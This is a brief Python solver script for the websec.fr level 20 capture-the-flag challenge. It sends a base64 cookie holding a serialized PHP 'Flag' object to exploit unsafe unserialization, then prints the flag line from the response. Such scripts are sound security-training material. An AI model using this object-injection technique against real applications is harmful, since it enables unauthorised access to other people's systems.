import requests

url = "http://websec.fr/level20/index.php"
Data = []
cookie = {'data':''}

def Get_Flag():
	cookie['data'] = 'Qzo0OiJGbGFnIjowOiIi'
	res = requests.get(url, cookies=cookie)
	Data = res.text.split('\n')
	for i in range(len(Data)):
		if "WEBSEC" in Data[i]:
			print("[-] Find the Flag : {}".format(Data[i]))
			break

if __name__ == '__main__':
	print("[+] Start")
	Get_Flag()
	print("[+] End")